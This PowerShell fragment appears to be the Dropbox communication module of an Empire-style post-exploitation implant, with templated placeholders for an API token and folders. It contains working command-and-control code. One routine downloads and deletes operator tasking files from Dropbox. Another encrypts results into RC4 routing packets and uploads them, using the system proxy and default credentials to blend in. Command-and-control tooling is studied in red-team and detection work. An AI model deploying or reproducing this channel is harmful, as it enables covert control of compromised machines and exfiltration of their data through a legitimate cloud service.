$Script:APIToken = "{{ api_token}}";

$Script:GetTask = {
        try {
            # build the web request object
            $wc= New-Object System.Net.WebClient;

            # set the proxy settings for the WC to be the default system settings
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            if($Script:Proxy) {
                $wc.Proxy = $Script:Proxy;
            }

            $wc.Headers.Add("User-Agent", $Script:UserAgent);
            $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};

            $TaskingsFolder = '{{ tasking_folder }}';
            $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)");
            $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($Script:SessionID).txt`"}");
            $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download");

            if($Data -and ($Data.Length -ne 0)) {
                # if there was a tasking data, remove it
                $wc.Headers.Add("Content-Type", " application/json");
                $wc.Headers.Remove("Dropbox-API-Arg");
                $Null=$wc.UploadString("https://api.dropboxapi.com/2/files/delete_v2", "POST", "{`"path`":`"$TaskingsFolder/$($Script:SessionID).txt`"}");
                $Data;
            }
            $Script:MissedCheckins = 0;
        }
        catch {
            if ($_ -match 'Unable to connect') {
                $Script:MissedCheckins += 1;
            }
        }
    };

$Script:SendMessage = {
    param($Packets)

    if ($Packets)
    {
        # build and encrypt the response packet
        $EncBytes = Encrypt-Bytes $Packets;

        # build the top level RC4 "routing packet"
        # meta 'RESULT_POST' : 5
        $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;

        # build the web request object
        $wc = New-Object System.Net.WebClient;
        # set the proxy settings for the WC to be the default system settings
        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
        if ($Script:Proxy)
        {
            $wc.Proxy = $Script:Proxy;
        }

        $wc.Headers.Add('User-Agent', $Script:UserAgent);
        $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};

        $ResultsFolder = '{{ results_folder }}';

        try
        {
            # check if the results file is still in the specified location, if so then
            #   download the file and append the new routing packet to it
            try
            {
                $Data = $Null;
                $wc.Headers.Set("Authorization", "Bearer $( $Script:APIToken )");
                $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$( $Script:SessionID ).txt`"}");
                $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download");
            }
            catch
            {
            }

            if ($Data -and $Data.Length -ne 0)
            {
                $RoutingPacket = $Data + $RoutingPacket;
            }

            $wc2 = New-Object System.Net.WebClient;
            $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            if ($Script:Proxy)
            {
                $wc2.Proxy = $Script:Proxy;
            }

            $wc2.Headers.Add("Authorization", "Bearer $( $Script:APIToken )");
            $wc2.Headers.Add("Content-Type", "application/octet-stream");
            $wc2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($Script:SessionID).txt`"}");
            $Null = $wc2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket);
            $Script:MissedCheckins = 0;
        }
        catch
        {
            if ($_ -match 'Unable to connect')
            {
                $Script:MissedCheckins += 1;
            }
        }
    }
};